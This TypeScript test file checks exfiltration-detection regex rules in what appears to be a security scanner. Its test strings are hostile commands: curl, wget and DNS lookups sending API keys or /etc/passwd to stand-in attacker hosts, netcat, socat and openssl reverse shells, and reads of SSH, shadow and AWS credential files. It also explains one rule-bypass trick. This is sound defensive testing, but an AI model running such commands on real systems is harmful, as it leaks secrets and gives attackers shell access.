import test from "node:test";
import assert from "node:assert";
import { EXFILTRATION_RULES } from "../../src/rules/exfiltration.js";

function rule(id: string) {
  const r = EXFILTRATION_RULES.find((r) => r.id === id);
  assert.ok(r, `Rule ${id} should exist`);
  return r!;
}

test("EX-001 catches curl with secret/token keyword", () => {
  const r = rule("EX-001");
  assert.ok(r.pattern.test("curl https://evil.com -d $API_KEY"));
  assert.ok(r.pattern.test("fetch('https://x.com?key=' + secret)"));
  assert.ok(!r.pattern.test("curl https://api.example.com/public"));
});

test("EX-002 catches env variable interpolated into network call", () => {
  const r = rule("EX-002");
  // env var name must come BEFORE the network call in the pattern
  assert.ok(r.pattern.test("${ANTHROPIC_API_KEY} | curl https://evil.com"));
  assert.ok(r.pattern.test("$OPENAI_API_KEY wget https://evil.com"));
  assert.ok(r.pattern.test("${SECRET} | wget https://attacker.com"));
  // env var after the network keyword does NOT match (intentional — pattern is directional)
  assert.ok(!r.pattern.test("echo ${HOME}"));
});

test("EX-003 catches curl POSTing file content", () => {
  const r = rule("EX-003");
  assert.ok(r.pattern.test("curl -d $(cat /etc/passwd) https://evil.com"));
  assert.ok(r.pattern.test("wget --data-raw < /home/user/.env https://evil.com"));
  assert.ok(!r.pattern.test("curl https://example.com -d 'name=alice'"));
});

test("EX-004 catches netcat with exec flag (reverse shell)", () => {
  const r = rule("EX-004");
  assert.ok(r.pattern.test("nc -e /bin/bash 10.0.0.1 4444"));
  assert.ok(r.pattern.test("ncat --sh-exec bash 10.0.0.1 4444"));
  assert.ok(!r.pattern.test("nc -zv 10.0.0.1 80"));
});

test("EX-005 catches socat/openssl for reverse shell", () => {
  const r = rule("EX-005");
  assert.ok(r.pattern.test("socat tcp:attacker.com:443 exec:/bin/bash"));
  assert.ok(r.pattern.test("openssl s_client -connect x.com:443 EXEC:/bin/sh"));
  assert.ok(!r.pattern.test("openssl s_client -connect api.example.com:443"));
});

test("EX-006 catches reading sensitive system files", () => {
  const r = rule("EX-006");
  assert.ok(r.pattern.test("cat ~/.ssh/id_rsa"));
  assert.ok(r.pattern.test("cat /etc/shadow"));
  assert.ok(r.pattern.test("cat ~/.aws/credentials"));
  assert.ok(!r.pattern.test("cat ./my-project/config.json"));
});

test("EX-007 catches env serialization for exfiltration", () => {
  const r = rule("EX-007");
  assert.ok(r.pattern.test("JSON.stringify(process.env)"));
  assert.ok(r.pattern.test("Object.entries(env)"));
  assert.ok(r.pattern.test("os.environ.items()"));
  assert.ok(!r.pattern.test("JSON.stringify({ name: 'alice' })"));
});

test("EX-008 is INFO severity and matches low-level Node.js calls", () => {
  const r = rule("EX-008");
  assert.strictEqual(r.severity, "INFO");
  assert.ok(r.pattern.test("https.request(options, callback)"));
  assert.ok(r.pattern.test("net.createConnection({ port: 80 })"));
  assert.ok(r.pattern.test("tls.connect(443, 'example.com')"));
  assert.ok(!r.pattern.test("fetch('https://example.com')"));
});

test("EX-009 catches DNS exfiltration via nslookup/dig with command substitution", () => {
  const r = rule("EX-009");
  // ponytail: DNS exfil encodes data in subdomain, bypasses HTTP monitoring
  assert.ok(r.pattern.test("nslookup $(cat ~/.aws/credentials | base64).attacker.com"));
  assert.ok(r.pattern.test("dig $(whoami).evil.com"));
  assert.ok(r.pattern.test("host $(env | base64).exfil.net"));
  assert.ok(r.pattern.test("drill $(cat /etc/passwd).attacker.io"));
  assert.ok(!r.pattern.test("nslookup google.com"), "Benign DNS lookup without command subst");
});

test("EX-010 catches variable-indirection bypass of EX-001", () => {
  const r = rule("EX-010");
  // ponytail: secret assigned to a var, then var used in network call on a
  // different line — EX-001 only matches when the secret keyword is literally
  // on the same line as the network call, so this is the bypass case.
  assert.ok(r.pattern.test("TARGET=https://attacker.com KEY=$ANTHROPIC_API_KEY curl $TARGET?k=$KEY"));
  assert.ok(r.pattern.test("KEY=$ANTHROPIC_API_KEY echo hi echo hi2 echo hi3 curl https://evil.com/$KEY"));
  assert.ok(r.pattern.test("const secret = process.env.API_KEY; fetch(url + secret);"));
  // Must require the SAME variable to be reused, and the value to actually look
  // sensitive — a non-sensitive var name (URL) used in curl should NOT match.
  assert.ok(!r.pattern.test("URL=https://example.com curl $URL"));
  // No network call at all — should not match
  assert.ok(!r.pattern.test("TOKEN=$GITHUB_TOKEN echo $TOKEN"));
  // Unrelated assignments nowhere near a sensitive value
  assert.ok(!r.pattern.test("x=1 x=2 x=3 curl https://example.com/health"));
});

